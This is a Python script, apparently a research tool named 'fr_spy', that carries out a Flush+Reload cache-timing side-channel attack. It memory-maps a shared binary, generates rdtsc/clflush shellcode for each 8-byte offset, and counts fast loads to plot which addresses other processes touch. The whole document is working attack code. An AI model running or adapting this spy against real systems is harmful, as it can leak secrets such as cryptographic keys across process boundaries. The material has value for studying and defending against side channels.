from PyShellCode import ExecutableCode

import ctypes
import numpy as np
import matplotlib.pyplot as plt

import mmap
import sys
import os

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print("Usage fr_spy.py binary");
        sys.exit(1)

    statinfo = os.stat(sys.argv[1])
    filesize = statinfo.st_size
    print(filesize)

    f = open(sys.argv[1], "rb")
    buf = mmap.mmap(f.fileno(), 0, mmap.MAP_SHARED, mmap.PROT_READ)
    obj = ctypes.py_object(buf)
    address = ctypes.c_void_p()
    length = ctypes.c_ssize_t()
    ctypes.pythonapi.PyObject_AsReadBuffer(obj, ctypes.byref(address), ctypes.byref(length))
    ptr = address.value
    print(ptr)

    flushandreload_nasm_code = """
        mfence
        rdtsc
        shl   rdx, 32
        or    rax, rdx
        mfence
        mov   rcx, rax  ; Save rax
        mov   rbx, {ptr}
        mov   rax, [rbx]
        mfence
        rdtsc
        shl   rdx, 32
        or    rax, rdx
        mfence
        sub   rax, rcx
        mov   rcx, rax
        mov   rax, {ptr}
        clflush [rax]
        mov   rax, rcx
        ret
    """
    sched_yield_nasm_code = """
        mov rax, 0x9e
        int 0x80
        ret
    """

    sched_yield = ExecutableCode.ExecutableCode.from_NASMCode(sched_yield_nasm_code)

    print("Generating flushandreload instructions: ", filesize / 8)
    flushandreloads = []
    for i in range(0, filesize, 8):
        if i % 100 == 0:
            print(i)
        flushandreloads.append(ExecutableCode.ExecutableCode.from_NASMCode(flushandreload_nasm_code.format(ptr=ptr+i)))

    N = len(flushandreloads)
    print("Total test points", N)

    print("Start Monitoring")
    M = 20*1024
    hits = np.zeros(N)
    for j in range(M):
        if j % 1000 == 0:
            print(j)
        for i in range(N):
            delta = flushandreloads[i]()
            if delta < 160:
                hits[i] += 1
            sched_yield()

    plt.plot(hits, label='HitsPerAddress')
    plt.legend()
    plt.show()
